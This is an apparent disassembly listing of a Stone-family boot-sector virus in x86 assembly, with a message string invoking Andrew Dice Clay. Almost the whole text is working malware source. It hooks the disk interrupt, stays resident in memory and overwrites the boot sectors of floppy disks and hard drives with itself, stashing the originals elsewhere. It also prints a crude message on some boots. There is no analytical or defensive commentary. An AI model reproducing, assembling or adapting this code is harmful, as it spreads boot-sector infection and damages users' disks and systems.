
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ								         ÛÛ
;ÛÛ			        STONE				         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛ      Created:   1-Jan-80					         ÛÛ
;ÛÛ      Passes:    5	       Analysis Options on: none	         ÛÛ
;ÛÛ								         ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

d_0000_004C_e	equ	4Ch
d_0000_004E_e	equ	4Eh
main_ram_size_	equ	413h
timer_low_	equ	46Ch
d_0000_7C00_e	equ	7C00h			;*
d_0000_7C0A_e	equ	7C0Ah			;*
d_0000_7C0C_e	equ	7C0Ch			;*
d_0000_7C10_e	equ	7C10h			;*
data_0000_e	equ	0
data_0008_e	equ	8
data_0009_e	equ	9
data_000A_e	equ	0Ah
data_000E_e	equ	0Eh
data_0012_e	equ	12h
data_03E0_e	equ	3E0h			;*

seg_a		segment	byte public
		assume	cs:seg_a, ds:seg_a


		org	100h

stone		proc	far

start:
;*		jmp	far ptr l_07C0_0005	;*
		db	0EAh, 05h, 00h,0C0h, 07h
		jmp	loc_01C1
		db	 00h, 00h, 00h, 00h, 00h, 00h
		db	 04h, 01h, 00h, 00h, 00h, 7Ch
		db	 00h, 00h, 1Eh, 50h, 80h,0FCh
		db	 02h, 72h, 18h, 80h,0FCh, 04h
		db	 73h, 13h, 80h,0FAh, 00h, 75h
		db	 0Eh, 33h,0C0h, 8Eh,0D8h,0A0h
		db	 40h, 04h, 0Ah,0C0h, 75h, 03h
		db	0E8h, 07h, 00h
		db	 58h, 1Fh, 2Eh,0FFh, 2Eh, 0Ah
		db	 00h
		db	 53h, 51h, 52h, 06h, 56h, 57h
		db	0BEh, 04h, 00h
loc_0145:
		mov	ax,201h
		push	cs
		pop	es
		mov	bx,200h
		mov	cx,1
		xor	dx,dx			; Zero register
		pushf				; Push flags
		call	dword ptr cs:data_000A_e
		jnc	loc_0168		; Jump if carry=0
		xor	ax,ax			; Zero register
		pushf				; Push flags
		call	dword ptr cs:data_000A_e
		dec	si
		jnz	loc_0145		; Jump if not zero
		jmp	short loc_01A5
		db	90h
loc_0168:
		xor	si,si			; Zero register
		mov	di,200h
		mov	ax,es:[si]
		cmp	ax,es:[di]
		jne	loc_0182		; Jump if not equal
		mov	ax,es:[si+2]
		cmp	ax,es:[di+2]
		jne	loc_0182		; Jump if not equal
		jmp	short loc_01A5
		db	90h
loc_0182:
		mov	ax,301h
		mov	bx,200h
		mov	cx,3
		mov	dx,100h
		pushf				; Push flags
		call	dword ptr cs:data_000A_e
		jc	loc_01A5		; Jump if carry Set
		mov	ax,301h
		xor	bx,bx			; Zero register
		mov	cl,1
		xor	dx,dx			; Zero register
		pushf				; Push flags
		call	dword ptr cs:data_000A_e
loc_01A5:
		pop	di
		pop	si
		pop	es
		pop	dx
		pop	cx
		pop	bx
		retn

stone		endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_01AC	proc	near
loc_01AC:
		mov	al,cs:[bx]
		inc	bx
		cmp	al,0
		jne	loc_01B5		; Jump if not equal
		retn
loc_01B5:
		push	ax
		push	bx
		mov	ah,0Eh
		mov	bh,0
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		pop	bx
		pop	ax
		jmp	short loc_01AC
sub_01AC	endp

loc_01C1:
		xor	ax,ax			; Zero register
		mov	ds,ax
		cli				; Disable interrupts
		mov	ss,ax
		mov	sp,7C00h
		sti				; Enable interrupts
		mov	ax,ds:d_0000_004C_e
		mov	ds:d_0000_7C0A_e,ax
		mov	ax,ds:d_0000_004E_e
		mov	ds:d_0000_7C0C_e,ax
		mov	ax,ds:main_ram_size_
		dec	ax
		dec	ax
		mov	ds:main_ram_size_,ax
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		mov	es,ax
		mov	ds:d_0000_7C10_e,ax
		mov	ax,16h
		mov	ds:d_0000_004C_e,ax
		mov	ds:d_0000_004E_e,es
		mov	cx,1E0h
		push	cs
		pop	ds
		xor	si,si			; Zero register
		mov	di,si
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		jmp	dword ptr cs:data_000E_e
		mov	ax,0
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	ax,201h
		mov	bx,d_0000_7C00_e
		cmp	byte ptr cs:data_0008_e,0
		je	loc_0226		; Jump if equal
		mov	cx,2
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jmp	short loc_0266
		db	90h
loc_0226:
		mov	cx,3
		mov	dx,100h
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0266		; Jump if carry Set
		test	byte ptr es:timer_low_,7
		jnz	loc_023E		; Jump if not zero
		mov	bx,1B2h
		call	sub_01AC
loc_023E:
		push	cs
		pop	es
		mov	ax,201h
		mov	bx,200h
		mov	cx,1
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0266		; Jump if carry Set
		push	cs
		pop	ds
		mov	si,200h
		mov	di,data_0000_e
		mov	ax,[si]
		cmp	ax,[di]
		jne	loc_0277		; Jump if not equal
		mov	ax,[si+2]
		cmp	ax,[di+2]
		jne	loc_0277		; Jump if not equal
loc_0266:
		mov	byte ptr cs:data_0008_e,0
		mov	byte ptr cs:data_0009_e,0
		jmp	dword ptr cs:data_0012_e
loc_0277:
		mov	byte ptr cs:data_0008_e,2
		mov	byte ptr cs:data_0009_e,0
		mov	ax,301h
		mov	bx,200h
		mov	cx,2
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jc	loc_0266		; Jump if carry Set
		push	cs
		pop	ds
		push	cs
		pop	es
		mov	si,data_03E0_e
		mov	di,1E0h
		mov	cx,0FDE0h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	ax,301h
		mov	bx,data_0000_e
		mov	cx,1
		mov	dx,80h
		int	13h			; Disk  dl=drive 0  ah=func 03h
						;  write sectors from mem es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		jmp	short loc_0266
		db	7
                db      'I am Andrew Dice Clay!'
		db	 07h, 0Dh, 0Ah, 0Ah, 00h
                db      'So, BLOW ME....Hey!'

seg_a		ends



		end	start
